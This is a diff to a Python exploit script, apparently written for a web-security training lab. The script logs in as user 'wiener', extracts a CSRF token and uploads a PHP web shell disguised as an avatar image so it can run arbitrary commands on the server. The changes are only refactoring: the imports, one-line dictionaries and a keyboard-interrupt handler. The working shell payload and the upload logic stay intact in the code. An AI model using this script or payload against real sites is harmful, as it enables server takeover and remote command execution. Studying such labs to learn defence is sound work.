@@ -1,7 +1,7 @@
 import requests
 import sys
 from bs4 import BeautifulSoup
-from requests.adapters import HTTPAdapter, Retry
+
 
 
 def extract_csrf_token(response):
@@ -26,13 +26,8 @@ def login(url, session):
 def upload_file(url, session):
     response = session.get(f"{url}/my-account", timeout=10)
     csrf_token = extract_csrf_token(response)
-    file = {
-        "avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")
-    }
-    data = {
-        "user": "wiener",
-        "csrf": csrf_token
-    }
+    file = {"avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")}
+    data = {"user": "wiener","csrf": csrf_token}
     upload_response = session.post(f"{url}/my-account/avatar", files=file, data=data, timeout=10)
     return upload_response.status_code == 200
 
@@ -51,7 +46,7 @@ def main():
     try:
         url = sys.argv[1].rstrip("/")
         session = requests.Session()
-        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))
 
         print("(+) Logging in...")
         if not login(url, session):
@@ -74,6 +69,9 @@ def main():
 
     except requests.exceptions.ConnectionError:
         print("(-) Unable to connect to host. Please check your URL and try again.")
+
+    except KeyboardInterrupt:
+        sys.exit(1)
 
 
 if __name__ == "__main__":
